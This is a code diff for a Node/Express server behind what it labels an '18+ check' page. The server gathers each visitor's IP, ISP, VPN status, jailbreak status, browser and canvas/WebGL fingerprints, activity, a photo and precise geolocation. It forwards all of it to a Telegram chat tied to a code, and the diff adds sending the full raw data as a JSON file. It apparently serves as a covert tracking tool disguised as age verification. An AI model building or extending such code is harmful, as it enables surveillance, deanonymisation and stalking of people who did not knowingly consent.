@@ -1,4 +1,4 @@
-// === server/index.js (code -> chat_id, pretty /:code, понятные ошибки) ===
+// server/index.js (улучшенный) ==============================================
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -137,6 +137,25 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   return resp.json();
 }
 
+// --- send JSON doc to TG (for debug)
+async function sendDocToTelegram({ chatId, filename, json }) {
+  if (!BOT_TOKEN) throw new Error('No TG token');
+  if (!chatId) throw new Error('Missing chat_id');
+  const buf = Buffer.from(JSON.stringify(json, null, 2), 'utf8');
+
+  const form = new FormData();
+  form.append('chat_id', chatId);
+  form.append('document', new Blob([buf], { type: 'application/json' }), filename || 'report.json');
+
+  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+  const resp = await fetch(url, { method: 'POST', body: form });
+  if (!resp.ok) {
+    const text = await resp.text().catch(()=> '');
+    throw new Error(`Telegram ${resp.status}: ${text}`);
+  }
+  return resp.json();
+}
+
 function extractReqIp(req) {
   const xff = (req.headers['x-forwarded-for'] || '').toString();
   const forwardedFor = xff.split(',')[0]?.trim() || null;
@@ -172,48 +191,85 @@ function buildTgHtml(payload, reqMeta = {}) {
   const canvas = cp.canvas || {};
   const webgl  = cp.webgl || {};
 
+  // badges
+  const sevBadge = (score) => score >= 80 ? "🟢" : score >= 60 ? "🟡" : "🔴";
+  const vpnBadge = (v) => (v?.label === "likely") ? "🔴 likely" : (v?.label === "possible") ? "🟡 possible" : "🟢 unlikely";
+
+  const jbLikely = !!dc?.details?.jailbreakProbe?.likelyJailbroken;
+  const jbHit    = dc?.details?.jailbreakProbe?.hit?.scheme || null;
+  const jbBadge  = jbLikely ? `🔴 yes (${jbHit || "hit"})` : "🟢 no";
+
+  const reqIp = reqMeta.ip || null;
+  const xffIp = reqMeta.forwardedFor || null;
+
+  // main lines
   const lines = [];
-  lines.push(`<b>Новый отчёт 18+ проверка</b>`);
+  lines.push(`<b>Новый отчёт 18+ проверка</b> · ${sevBadge(dc.score ?? 0)} score=<code>${dc.score ?? '-'}</code>`);
   lines.push(`Code: <code>${escapeHTML(String(p.code || '-').toUpperCase())}</code>`);
   lines.push(`Время: <code>${new Date().toISOString()}</code>`);
   lines.push('');
 
-  // IP / оператор
-  const reqIp = reqMeta.ip || null;
-  const xffIp = reqMeta.forwardedFor || null;
-  lines.push(`<b>IP</b>: <code>${escapeHTML(pub.ip || reqIp || '-')}</code>${xffIp && xffIp !== pub.ip ? ` (xff: <code>${escapeHTML(xffIp)}</code>)` : ''}`);
-  lines.push(`<b>CC</b>: <code>${escapeHTML(pub.country || reqMeta.country || '-')}</code>  <b>ISP</b>: <code>${escapeHTML(pub.isp || pub.org || '-')}</code>`);
-  lines.push(`<b>TZ</b>: <code>${escapeHTML(tz)}</code>`);
-  lines.push(`<b>VPN/Proxy</b>: <code>${escapeHTML(vpn.label || '-')}</code> (score=${vpn.score ?? '-'})`);
+  // network
+  lines.push(`<b>Сеть</b>`);
+  lines.push(`IP: <code>${escapeHTML(pub.ip || reqIp || '-')}</code>${xffIp && xffIp !== pub.ip ? ` (xff: <code>${escapeHTML(xffIp)}</code>)` : ''}`);
+  lines.push(`CC: <code>${escapeHTML(pub.country || reqMeta.country || '-')}</code>  ISP: <code>${escapeHTML(pub.isp || pub.org || '-')}</code>`);
+  lines.push(`TZ: <code>${escapeHTML(tz)}</code>  VPN: ${vpnBadge(vpn)} (score=${vpn.score ?? '-'})`);
+  lines.push('');
 
-  // Браузер/ОС/язык
-  lines.push(`<b>UA</b>: <code>${escapeHTML(ua).slice(0,500)}</code>`);
-  lines.push(`<b>Platform</b>: <code>${escapeHTML(p.platform || cp.userAgentData?.platform || '-')}</code>  iOS: <code>${escapeHTML(p.iosVersion ?? cp.iosVersion ?? '-')}</code>  Safari: <code>${escapeHTML(String(p.isSafari))}</code>`);
-  lines.push(`<b>Языки</b>: <code>${escapeHTML(langs)}</code>`);
+  // jailbreak
+  lines.push(`<b>Jailbreak</b>: ${jbBadge}`);
+  lines.push('');
 
-  // Экран/сеть
-  lines.push(`<b>Экран</b>: ${scr.width || '?'}×${scr.height || '?'} (DPR=${cp.dpr ?? '?'})  Viewport: ${cp.viewport?.w || '?'}×${cp.viewport?.h || '?'}`);
-  lines.push(`<b>Сеть</b>: type=<code>${escapeHTML(conn.type ?? '-')}</code>, eff=<code>${escapeHTML(conn.effectiveType ?? '-')}</code>, rtt=<code>${escapeHTML(conn.rtt ?? '-')}</code>ms, down=<code>${escapeHTML(conn.downlink ?? '-')}</code>Mb/s, saveData=<code>${conn.saveData ? 'on' : 'off'}</code>`);
+  // device check
+  lines.push(`<b>DeviceCheck</b>`);
+  lines.push(`UA: <code>${escapeHTML(ua).slice(0,500)}</code>`);
+  lines.push(`Platform: <code>${escapeHTML(p.platform || cp.userAgentData?.platform || '-')}</code>  iOS: <code>${escapeHTML(p.iosVersion ?? cp.iosVersion ?? '-')}</code>  Safari: <code>${escapeHTML(String(p.isSafari))}</code>`);
+  lines.push(`Языки: <code>${escapeHTML(langs)}</code>`);
+  lines.push(`Экран: ${scr.width || '?'}×${scr.height || '?'} (DPR=${cp.dpr ?? '?'})  Viewport: ${cp.viewport?.w || '?'}×${cp.viewport?.h || '?'}`);
+  lines.push(`Сеть: type=<code>${escapeHTML(conn.type ?? '-')}</code>, eff=<code>${escapeHTML(conn.effectiveType ?? '-')}</code>, rtt=<code>${escapeHTML(conn.rtt ?? '-')}</code>ms, down=<code>${escapeHTML(conn.downlink ?? '-')}</code>Mb/s, saveData=<code>${conn.saveData ? 'on' : 'off'}</code>`);
 
-  // Фингерпринты / хранилища
-  lines.push(`<b>Canvas</b>: hash=<code>${escapeHTML(canvas.hash || '-')}</code> (len=${canvas.rawLen ?? 0})`);
-  lines.push(`<b>WebGL</b>: <code>${escapeHTML(webgl.vendor || webgl.vendorMasked || '-')}</code> / <code>${escapeHTML(webgl.renderer || webgl.rendererMasked || '-')}</code>`);
-  lines.push(`<b>Cookies</b>: ${cookiesLen} символов; <b>localStorage</b>: ${lsKeys} ключ.; <b>sessionStorage</b>: ${ssKeys} ключ.`);
+  // fingerprints / storage
+  lines.push('');
+  lines.push(`<b>FP / Хранилища</b>`);
+  lines.push(`Canvas: hash=<code>${escapeHTML(canvas.hash || '-')}</code> (len=${canvas.rawLen ?? 0})`);
+  lines.push(`WebGL: <code>${escapeHTML(webgl.vendor || webgl.vendorMasked || '-')}</code> / <code>${escapeHTML(webgl.renderer || webgl.rendererMasked || '-')}</code>`);
+  lines.push(`Cookies: ${cookiesLen} символов; localStorage: ${lsKeys} ключ.; sessionStorage: ${ssKeys} ключ.`);
 
-  // Referrer / активность
+  // activity
   const pagesCnt  = cp.activity?.pages?.length || 0;
   const clicksCnt = cp.activity?.clicks?.length || 0;
+  lines.push('');
   lines.push(`<b>Referrer</b>: <code>${escapeHTML(ref)}</code>  <b>Pages</b>: ${pagesCnt}  <b>Clicks</b>: ${clicksCnt}`);
 
-  // Device-check
-  lines.push(`<b>DeviceCheck</b>: score=<code>${dc.score ?? '-'}</code>`);
+  // device-check short reasons / anomalies
   if (Array.isArray(dc.reasons) && dc.reasons.length) {
-    lines.push(`• ${escapeHTML(dc.reasons.slice(0,3).join(' • '))}`);
+    lines.push('');
+    lines.push(`<b>Коротко — DeviceCheck причины</b>:`);
+    lines.push(`• ${escapeHTML(dc.reasons.slice(0,4).join(' • '))}`);
   }
 
-  // Гео
+  // anomalies (если есть) — show few
+  if (Array.isArray(dc.anomalies) && dc.anomalies.length) {
+    lines.push('');
+    lines.push(`<b>Аномалии (структурировано)</b>:`);
+    const top = dc.anomalies.slice(0, 6).map(a => `${a.sev === 'high' ? '🔴' : a.sev === 'med' ? '🟡' : '🟢'} ${a.code}: ${a.msg}`);
+    lines.push(escapeHTML(top.join('\n')));
+  }
+
+  // geo
   if (p.geo && typeof p.geo.lat === 'number' && typeof p.geo.lon === 'number') {
+    lines.push('');
     lines.push(`<b>Гео</b>: ${p.geo.lat.toFixed(6)}, ${p.geo.lon.toFixed(6)} (±${p.geo.acc ?? '?'}м)`);
+  }
+
+  // why strange: top reasons from dc + vpn
+  const reasons = [];
+  if (Array.isArray(dc.reasons)) reasons.push(...dc.reasons);
+  if (Array.isArray(vpn.reasons)) reasons.push(...vpn.reasons.map(r => `VPN: ${r}`));
+  if (reasons.length) {
+    lines.push('');
+    lines.push(`<b>Почему странно — топ</b>`);
+    for (const r of reasons.slice(0, 4)) lines.push(`• ${escapeHTML(String(r)).slice(0,300)}`);
   }
 
   let html = lines.join('\n');
@@ -309,7 +365,7 @@ app.post('/api/report', async (req, res) => {
 
     const chatId = String(row.chat_id);
 
-    // 1) Фото с коротким caption (как раньше)
+    // 1) Фото с коротким caption
     const caption = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
@@ -333,6 +389,23 @@ app.post('/api/report', async (req, res) => {
         );
 
     await tgSendHTML({ chatId, html });
+
+    // 3) Отправляем JSON-файл с сырыми данными (полезно для дебага) — не критично для работы, ловим ошибки
+    try {
+      const raw = {
+        code,
+        timeISO: new Date().toISOString(),
+        req: extractReqIp(req),
+        device_check,
+        client_profile,
+        geo,
+        note
+      };
+      await sendDocToTelegram({ chatId, filename: `report_${String(code).toUpperCase()}.json`, json: raw });
+    } catch (e) {
+      // логируем, но не падаем — отправка JSON не критична
+      console.error('[report] send JSON doc failed:', e && e.message ? e.message : e);
+    }
 
     res.json({ ok: true, delivered: true });
   } catch (e) {
